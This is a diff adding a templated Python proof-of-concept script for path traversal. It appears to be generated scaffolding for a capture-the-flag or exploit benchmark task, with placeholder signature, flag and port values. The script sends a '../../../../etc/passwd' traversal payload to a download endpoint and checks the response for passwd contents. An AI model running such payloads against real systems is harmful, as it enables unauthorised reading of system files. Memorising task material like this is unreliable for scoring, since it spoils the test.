@@ -1,0 +1,38 @@
+# Asset-backed family-aware fallback template for Path Traversal.
+import argparse
+import sys
+from urllib.error import HTTPError, URLError
+from urllib.parse import quote
+from urllib.request import urlopen
+
+SUCCESS_SIGNATURE = __SUCCESS_SIGNATURE__
+FLAG_TOKEN = __FLAG_TOKEN__
+DEFAULT_PATH = '../../../../etc/passwd'
+
+
+def exploit(base_url: str) -> bool:
+    target = base_url.rstrip('/') + '/download?path=' + quote(DEFAULT_PATH)
+    try:
+        with urlopen(target, timeout=5) as resp:
+            body = resp.read().decode('utf-8', errors='ignore')
+    except (HTTPError, URLError) as exc:
+        print(f'[path-fallback] request failed: {exc}', file=sys.stderr)
+        return False
+    return 'root:' in body or 'localhost' in body
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description='Path traversal fallback PoC')
+    parser.add_argument('--base-url', default='http://127.0.0.1:__PORT__')
+    args = parser.parse_args()
+    if exploit(args.base_url):
+        print(SUCCESS_SIGNATURE)
+        if FLAG_TOKEN:
+            print(FLAG_TOKEN)
+        raise SystemExit(0)
+    print('[path-fallback] exploit did not succeed', file=sys.stderr)
+    raise SystemExit(1)
+
+
+if __name__ == '__main__':
+    main()
